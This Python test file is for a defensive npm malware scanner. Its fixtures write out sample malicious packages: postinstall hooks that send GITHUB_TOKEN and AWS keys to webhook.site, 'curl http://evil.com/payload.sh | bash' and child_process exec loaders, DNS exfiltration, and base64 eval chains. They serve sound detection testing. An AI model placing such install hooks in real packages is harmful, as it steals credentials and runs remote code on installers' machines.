"""Tests for supplyguard.scanner.rules_engine and scan_pipeline."""

import json
import tempfile
from pathlib import Path
from unittest.mock import MagicMock

import pytest
import torch

from supplyguard.scanner.rules_engine import MatchedRule, RulesResult, run_rules
from supplyguard.scanner.manifest_scanner import merge_manifest_rules, scan_manifest
from supplyguard.scanner.scan_pipeline import (
    ScanResult,
    ThresholdConfig,
    _decide,
    scan_package,
)

FIXTURES = Path(__file__).resolve().parent / "fixtures"


# ── Helpers ───────────────────────────────────────────────────────────────

def _make_package(tmp: Path, pkg_json: dict, files: dict[str, str]) -> Path:
    """Create a temp package with package.json and JS files."""
    (tmp / "package.json").write_text(json.dumps(pkg_json), encoding="utf-8")
    for name, content in files.items():
        f = tmp / name
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_text(content, encoding="utf-8")
    return tmp


# ── Test 1: Critical exfiltration pattern ─────────────────────────────────

def test_critical_exfiltration():
    """Package reads credential env vars + sends to webhook → CRITICAL."""
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg = _make_package(
            Path(tmpdir),
            pkg_json={
                "name": "evil-pkg",
                "version": "1.0.0",
                "scripts": {"postinstall": "node index.js"},
            },
            files={
                "index.js": (
                    'const https = require("https");\n'
                    "const token = process.env.GITHUB_TOKEN;\n"
                    "const key = process.env.AWS_SECRET_ACCESS_KEY;\n"
                    'https.get("https://webhook.site/abc123?t=" + token + "&k=" + key);\n'
                ),
            },
        )

        result = run_rules(str(pkg))

        print(f"\n--- Test 1: Critical Exfiltration ---")
        print(f"Score: {result.total_score}")
        print(f"Has critical: {result.has_critical}")
        for r in result.matched_rules:
            print(f"  [{r.severity}] {r.rule_id}: {r.description}")

        assert result.has_critical, "should have at least one critical rule"

        rule_ids = {r.rule_id for r in result.matched_rules}
        assert "CRIT_EXFIL_CREDENTIALS" in rule_ids, (
            "should match CRIT_EXFIL_CREDENTIALS"
        )
        assert "CRIT_INSTALL_HOOK_NETWORK" in rule_ids, (
            "should match CRIT_INSTALL_HOOK_NETWORK"
        )


# ── Test 2: Clean package ─────────────────────────────────────────────────

def test_clean_package():
    """Simple math utility — no rules should match."""
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg = _make_package(
            Path(tmpdir),
            pkg_json={"name": "math-utils", "version": "1.0.0"},
            files={
                "index.js": (
                    "function add(a, b) { return a + b; }\n"
                    "function multiply(a, b) { return a * b; }\n"
                    "module.exports = { add, multiply };\n"
                ),
            },
        )

        result = run_rules(str(pkg))

        print(f"\n--- Test 2: Clean Package ---")
        print(f"Score: {result.total_score}")
        print(f"Matched: {[r.rule_id for r in result.matched_rules]}")

        assert result.total_score == 0, f"expected 0 score, got {result.total_score}"
        assert not result.has_critical
        assert len(result.matched_rules) == 0


# ── Test 3: Benign with install hook (should NOT be flagged critical) ─────

def test_benign_install_hook():
    """Benign package with postinstall — only MED_INSTALL_HOOK_EXISTS."""
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg = _make_package(
            Path(tmpdir),
            pkg_json={
                "name": "my-tool",
                "version": "1.0.0",
                "scripts": {"postinstall": "node setup.js"},
            },
            files={
                "setup.js": (
                    'const fs = require("fs");\n'
                    'fs.mkdirSync("./cache", { recursive: true });\n'
                    'console.log("Setup complete");\n'
                ),
            },
        )

        result = run_rules(str(pkg))

        print(f"\n--- Test 3: Benign Install Hook ---")
        print(f"Score: {result.total_score}")
        for r in result.matched_rules:
            print(f"  [{r.severity}] {r.rule_id}: {r.description}")

        assert not result.has_critical, "benign install hook should NOT be critical"

        rule_ids = {r.rule_id for r in result.matched_rules}
        assert "MED_INSTALL_HOOK_EXISTS" in rule_ids, (
            "should match MED_INSTALL_HOOK_EXISTS"
        )
        # No HIGH or CRITICAL rules should match
        high_or_crit = [r for r in result.matched_rules
                        if r.severity in ("high", "critical")]
        assert len(high_or_crit) == 0, (
            f"no high/critical rules should match, got: "
            f"{[r.rule_id for r in high_or_crit]}"
        )


# ── Test 4: Obfuscated install hook ───────────────────────────────────────

def test_obfuscated_install_hook():
    """Install hook with hex escapes + base64 eval → HIGH rules."""
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg = _make_package(
            Path(tmpdir),
            pkg_json={
                "name": "totally-legit",
                "version": "0.0.1",
                "scripts": {"postinstall": "node index.js"},
            },
            files={
                "index.js": (
                    'const a = "\\x63\\x75\\x72\\x6c\\x20\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f";\n'
                    'eval(Buffer.from("Y29uc29sZS5sb2coJ293bmVkJyk=", "base64").toString());\n'
                ),
            },
        )

        result = run_rules(str(pkg))

        print(f"\n--- Test 4: Obfuscated Install ---")
        print(f"Score: {result.total_score}")
        for r in result.matched_rules:
            print(f"  [{r.severity}] {r.rule_id}: {r.description}")

        rule_ids = {r.rule_id for r in result.matched_rules}
        assert "HIGH_OBFUSCATED_INSTALL" in rule_ids, (
            "should match HIGH_OBFUSCATED_INSTALL"
        )
        assert "HIGH_EVAL_DECODED" in rule_ids, (
            "should match HIGH_EVAL_DECODED"
        )


# ── Test 5: Full pipeline integration ────────────────────────────────────

def test_pipeline_review_only_critical_needs_gnn_support():
    """Noisy critical install-hook network evidence should review at weak GNN."""
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg = _make_package(
            Path(tmpdir),
            pkg_json={
                "name": "evil-pkg",
                "version": "1.0.0",
                "scripts": {"postinstall": "node index.js"},
            },
            files={
                "index.js": (
                    'const https = require("https");\n'
                    "const token = process.env.GITHUB_TOKEN;\n"
                    'https.get("https://webhook.site/abc?t=" + token);\n'
                ),
            },
        )

        # Create a mock model that returns GNN score 0.5 (uncertain)
        mock_model = MagicMock()
        # scan_package calls _run_gnn which calls build_cpg + model forward
        # We'll mock at a higher level by patching _run_gnn

        from unittest.mock import patch
        with patch("supplyguard.scanner.scan_pipeline._run_gnn", return_value=0.5):
            result = scan_package(
                str(pkg),
                model=mock_model,
                device="cpu",
                threshold_config=ThresholdConfig(),
            )

        print(f"\n--- Test 5: Pipeline Integration ---")
        print(f"Verdict: {result.verdict}")
        print(f"GNN score: {result.gnn_score}")
        print(f"Decision path: {result.decision_path}")
        for e in result.evidence:
            print(f"  Evidence: {e}")

        assert result.verdict == "suspicious", (
            f"expected 'suspicious' review, got '{result.verdict}'"
        )
        assert "Review-only critical" in result.decision_path, (
            "decision path should explain review-only critical handling"
        )


# ── Test 6: CRIT_DYNAMIC_REQUIRE_EXEC ────────────────────────────────

def test_dynamic_require_exec_malicious():
    """Dynamic require with decoded arg + exec sink → CRITICAL."""
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg = _make_package(
            Path(tmpdir),
            pkg_json={"name": "sneaky-pkg", "version": "1.0.0"},
            files={
                "index.js": (
                    'const decoded = Buffer.from("aHR0cA==", "base64").toString();\n'
                    'const mod = require(decoded);\n'
                    'eval(mod.get("https://evil.com/payload"));\n'
                ),
            },
        )
        result = run_rules(str(pkg))
        rule_ids = {r.rule_id for r in result.matched_rules}
        assert "CRIT_DYNAMIC_REQUIRE_EXEC" in rule_ids, (
            f"expected CRIT_DYNAMIC_REQUIRE_EXEC, got: {rule_ids}"
        )


def test_dynamic_require_exec_benign():
    """Normal static require should NOT trigger dynamic require rule."""
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg = _make_package(
            Path(tmpdir),
            pkg_json={"name": "normal-pkg", "version": "1.0.0"},
            files={
                "index.js": (
                    'const fs = require("fs");\n'
                    'const path = require("path");\n'
                    'console.log(fs.readFileSync(path.join(__dirname, "data.txt")));\n'
                ),
            },
        )
        result = run_rules(str(pkg))
        rule_ids = {r.rule_id for r in result.matched_rules}
        assert "CRIT_DYNAMIC_REQUIRE_EXEC" not in rule_ids


# ── Test 7: HIGH_ENCODED_PAYLOAD_CHAIN ────────────────────────────────

def test_encoded_payload_chain_malicious():
    """Base64 payload + decode + eval within proximity → HIGH."""
    with tempfile.TemporaryDirectory() as tmpdir:
        payload = "Y29uc29sZS5sb2coJ293bmVkJykKcHJvY2Vzcy5leGl0KDAp" + "A" * 60
        pkg = _make_package(
            Path(tmpdir),
            pkg_json={"name": "payload-pkg", "version": "1.0.0"},
            files={
                "index.js": (
                    f'const payload = "{payload}";\n'
                    'const decoded = Buffer.from(payload, "base64").toString();\n'
                    'eval(decoded);\n'
                ),
            },
        )
        result = run_rules(str(pkg))
        rule_ids = {r.rule_id for r in result.matched_rules}
        assert "HIGH_ENCODED_PAYLOAD_CHAIN" in rule_ids, (
            f"expected HIGH_ENCODED_PAYLOAD_CHAIN, got: {rule_ids}"
        )


def test_encoded_payload_chain_benign():
    """Base64 without eval should NOT trigger."""
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg = _make_package(
            Path(tmpdir),
            pkg_json={"name": "b64-util", "version": "1.0.0"},
            files={
                "index.js": (
                    'const encoded = Buffer.from("hello world").toString("base64");\n'
                    'console.log(encoded);\n'
                ),
            },
        )
        result = run_rules(str(pkg))
        rule_ids = {r.rule_id for r in result.matched_rules}
        assert "HIGH_ENCODED_PAYLOAD_CHAIN" not in rule_ids


# ── Test 8: HIGH_DNS_EXFIL ────────────────────────────────────────────

def test_dns_exfil_malicious():
    """DNS resolve + process.env access → HIGH."""
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg = _make_package(
            Path(tmpdir),
            pkg_json={"name": "dns-sniff", "version": "1.0.0"},
            files={
                "index.js": (
                    'const dns = require("dns");\n'
                    'const host = process.env.HOSTNAME || os.hostname();\n'
                    'dns.resolve(host + ".evil.com", () => {});\n'
                ),
            },
        )
        result = run_rules(str(pkg))
        rule_ids = {r.rule_id for r in result.matched_rules}
        assert "HIGH_DNS_EXFIL" in rule_ids, (
            f"expected HIGH_DNS_EXFIL, got: {rule_ids}"
        )


def test_dns_exfil_benign():
    """Plain dns.lookup without env access should NOT trigger."""
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg = _make_package(
            Path(tmpdir),
            pkg_json={"name": "dns-check", "version": "1.0.0"},
            files={
                "index.js": (
                    'const dns = require("dns");\n'
                    'dns.lookup("example.com", (err, addr) => console.log(addr));\n'
                ),
            },
        )
        result = run_rules(str(pkg))
        rule_ids = {r.rule_id for r in result.matched_rules}
        assert "HIGH_DNS_EXFIL" not in rule_ids


# ── Test 9: MED_SUSPICIOUS_PACKAGE_STRUCTURE ──────────────────────────

def test_suspicious_structure_malicious():
    """Minimal package with install hook, 1 file, few lines → MEDIUM."""
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg = _make_package(
            Path(tmpdir),
            pkg_json={
                "name": "tiny-evil",
                "version": "1.0.0",
                "scripts": {"postinstall": "node index.js"},
            },
            files={
                "index.js": 'console.log("hello");\n',
            },
        )
        result = run_rules(str(pkg))
        rule_ids = {r.rule_id for r in result.matched_rules}
        assert "MED_SUSPICIOUS_PACKAGE_STRUCTURE" in rule_ids, (
            f"expected MED_SUSPICIOUS_PACKAGE_STRUCTURE, got: {rule_ids}"
        )


def test_suspicious_structure_benign():
    """Package with many files, tests, and README should NOT trigger."""
    with tempfile.TemporaryDirectory() as tmpdir:
        tmp = Path(tmpdir)
        (tmp / "test").mkdir()
        (tmp / "test" / "test.js").write_text("// tests", encoding="utf-8")
        pkg = _make_package(
            tmp,
            pkg_json={
                "name": "well-made",
                "version": "1.0.0",
                "scripts": {"postinstall": "node setup.js"},
            },
            files={
                "index.js": "\n".join([f"const x{i} = {i};" for i in range(60)]),
                "lib/utils.js": "module.exports = {};\n",
                "setup.js": 'console.log("setup");\n',
            },
        )
        (tmp / "README.md").write_text("# Well Made\n\n" + "A" * 200,
                                       encoding="utf-8")
        result = run_rules(str(pkg))
        rule_ids = {r.rule_id for r in result.matched_rules}
        assert "MED_SUSPICIOUS_PACKAGE_STRUCTURE" not in rule_ids


# ── Test 10: HIGH_RUNTIME_PROTOTYPE_POLLUTION ─────────────────────────

def test_prototype_pollution_malicious():
    """__proto__ assignment + module.exports → HIGH."""
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg = _make_package(
            Path(tmpdir),
            pkg_json={"name": "proto-pkg", "version": "1.0.0"},
            files={
                "index.js": (
                    'function merge(target, src) {\n'
                    '  for (let key in src) {\n'
                    '    target.__proto__[key] = src[key];\n'
                    '  }\n'
                    '}\n'
                    'module.exports = merge;\n'
                ),
            },
        )
        result = run_rules(str(pkg))
        rule_ids = {r.rule_id for r in result.matched_rules}
        assert "HIGH_RUNTIME_PROTOTYPE_POLLUTION" in rule_ids, (
            f"expected HIGH_RUNTIME_PROTOTYPE_POLLUTION, got: {rule_ids}"
        )


def test_prototype_pollution_benign():
    """Normal prototype usage without module.exports should NOT trigger."""
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg = _make_package(
            Path(tmpdir),
            pkg_json={"name": "normal-class", "version": "1.0.0"},
            files={
                "index.js": (
                    'class Animal {\n'
                    '  constructor(name) { this.name = name; }\n'
                    '  speak() { return this.name; }\n'
                    '}\n'
                    'const a = new Animal("dog");\n'
                ),
            },
        )
        result = run_rules(str(pkg))
        rule_ids = {r.rule_id for r in result.matched_rules}
        assert "HIGH_RUNTIME_PROTOTYPE_POLLUTION" not in rule_ids


def test_install_hook_node_e_loader_malicious():
    """Install hook using node -e with a decoded loader should be critical."""
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg = _make_package(
            Path(tmpdir),
            pkg_json={
                "name": "node-e-loader",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": (
                        'node -e "eval(Buffer.from(\'Y29uc29sZS5sb2coMSk=\', '
                        '\'base64\').toString())"'
                    ),
                },
            },
            files={"index.js": 'console.log("loaded");\n'},
        )
        result = run_rules(str(pkg))
        rule_ids = {r.rule_id for r in result.matched_rules}
        assert "CRIT_INSTALL_HOOK_EXEC" in rule_ids


def test_self_delete_malicious():
    """Deleting __filename after execution should trigger anti-analysis rule."""
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg = _make_package(
            Path(tmpdir),
            pkg_json={"name": "cleanup-loader", "version": "1.0.0"},
            files={
                "index.js": (
                    'const fs = require("fs");\n'
                    "fs.unlinkSync(__filename);\n"
                ),
            },
        )
        result = run_rules(str(pkg))
        rule_ids = {r.rule_id for r in result.matched_rules}
        assert "HIGH_SELF_DELETE" in rule_ids


def test_low_confidence_gnn_with_weak_rule_is_review():
    """Weak single-signal evidence should review, not hard-block."""
    rr = RulesResult(
        matched_rules=[
            MatchedRule(
                rule_id="MED_INSTALL_HOOK_EXISTS",
                rule_name="Install Hook Present",
                severity="medium",
                description="postinstall: node index.js",
            ),
        ],
        total_score=2.0,
    )
    verdict, _, _, _ = _decide(0.40, rr, ThresholdConfig())
    assert verdict == "suspicious"


def test_low_confidence_gnn_without_rules_is_suspicious():
    """Unconfirmed GNN detections are retained for review instead of auto-cleaned."""
    verdict, _, _, _ = _decide(0.40, RulesResult(), ThresholdConfig())
    assert verdict == "suspicious"


def test_nonconfirming_rule_does_not_auto_confirm_gnn():
    """Noisy rules remain evidence, but do not confirm uncertain GNN hits alone."""
    rr = RulesResult(
        matched_rules=[
            MatchedRule(
                rule_id="MED_NETWORK_PLUS_FS",
                rule_name="Network + File System Access",
                severity="medium",
                description="Reads files and makes network requests",
            ),
        ],
        total_score=2.0,
    )
    verdict, _, _, _ = _decide(0.50, rr, ThresholdConfig())
    assert verdict == "suspicious"


def test_decide_blocks_high_confidence_gnn_with_confirming_rule():
    """High GNN score plus strong confirming static evidence should block."""
    rr = RulesResult(
        matched_rules=[
            MatchedRule(
                rule_id="CRIT_MANIFEST_CURL_PIPE",
                rule_name="Manifest Curl Pipe",
                severity="critical",
                description="curl output is piped into bash",
                score=15.0,
            )
        ],
        total_score=15.0,
    )

    verdict, confidence, path, _ = _decide(0.82, rr, ThresholdConfig())

    assert verdict == "malicious"
    assert confidence >= 0.90
    assert "confirming rules" in path


def test_decide_keeps_partial_gnn_confirmation_in_review():
    """A noisy single high rule should not hard-block at the precision profile."""
    rr = RulesResult(
        matched_rules=[
            MatchedRule(
                rule_id="HIGH_ENCODED_PAYLOAD_CHAIN",
                rule_name="Encoded Payload Chain",
                severity="high",
                description="decoded payload reaches eval",
                score=8.0,
            )
        ],
        total_score=8.0,
    )

    verdict, _, path, _ = _decide(0.82, rr, ThresholdConfig())

    assert verdict == "suspicious"
    assert "without strong static confirmation" in path


def test_decide_high_unconfirmed_gnn_is_review():
    """High model score without static confirmation should review, not mislabel."""
    verdict, _, path, _ = _decide(0.82, RulesResult(), ThresholdConfig())

    assert verdict == "suspicious"
    assert "without strong static confirmation" in path


def test_decide_rules_only_blocks_strong_confirming_evidence():
    """Rules-only fallback can still block when static evidence is strong."""
    rr = RulesResult(
        matched_rules=[
            MatchedRule(
                rule_id="CRIT_MANIFEST_CURL_PIPE",
                rule_name="Manifest Curl Pipe",
                severity="critical",
                description="curl output is piped into bash",
                score=15.0,
            )
        ],
        total_score=15.0,
        has_critical=True,
    )

    verdict, confidence, path, _ = _decide(None, rr, ThresholdConfig())

    assert verdict == "malicious"
    assert confidence >= 0.85
    assert "rules confirm" in path or "CRITICAL behavioral rule" in path


def test_fixture_malicious_install_hook_triggers_credential_rule():
    """Fixture packages make the main malware examples inspectable on disk."""
    result = run_rules(str(FIXTURES / "malicious-install-hook"))
    rule_ids = {rule.rule_id for rule in result.matched_rules}

    assert "CRIT_EXFIL_CREDENTIALS" in rule_ids


def test_manifest_curl_pipe_malicious():
    """postinstall curl pipe should trigger critical manifest rule."""
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg = _make_package(
            Path(tmpdir),
            pkg_json={
                "name": "curl-pipe-loader",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": "curl http://evil.com/payload.sh | bash",
                },
            },
            files={},
        )
        matches = scan_manifest(str(pkg))
        rule_ids = {r["rule_id"] for r in matches}
        assert "CRIT_MANIFEST_CURL_PIPE" in rule_ids


def test_manifest_node_eval_malicious():
    """node -e loader in package.json should trigger critical manifest rule."""
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg = _make_package(
            Path(tmpdir),
            pkg_json={
                "name": "node-e-package",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": (
                        "node -e \"require('child_process').exec("
                        "'curl http://evil.com')\""
                    ),
                },
            },
            files={},
        )
        matches = scan_manifest(str(pkg))
        rule_ids = {r["rule_id"] for r in matches}
        assert "CRIT_MANIFEST_NODE_EVAL" in rule_ids


def test_manifest_clean_scripts_no_matches():
    """Normal package.json scripts should not trigger manifest rules."""
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg = _make_package(
            Path(tmpdir),
            pkg_json={
                "name": "clean-scripts",
                "version": "1.0.0",
                "scripts": {"test": "jest", "start": "node index.js"},
            },
            files={"index.js": "console.log('ok');\n"},
        )
        assert scan_manifest(str(pkg)) == []


def test_manifest_whitelisted_install_hooks_no_matches():
    """Common benign lifecycle helpers should not create review noise."""
    for hook in ("husky install", "patch-package"):
        with tempfile.TemporaryDirectory() as tmpdir:
            pkg = _make_package(
                Path(tmpdir),
                pkg_json={
                    "name": "benign-hook",
                    "version": "1.0.0",
                    "scripts": {"postinstall": hook},
                },
                files={},
            )
            assert scan_manifest(str(pkg)) == []


def test_manifest_rules_merge_into_pipeline_scores():
    """Manifest criticals become normal rules evidence with explicit scores."""
    with tempfile.TemporaryDirectory() as tmpdir:
        pkg = _make_package(
            Path(tmpdir),
            pkg_json={
                "name": "manifest-critical",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": "curl http://evil.com/payload.sh | bash",
                },
            },
            files={},
        )
        result = merge_manifest_rules(RulesResult(), str(pkg))
        rule_ids = {r.rule_id for r in result.matched_rules}
        assert "CRIT_MANIFEST_CURL_PIPE" in rule_ids
        assert result.has_critical
        assert result.total_score >= 15
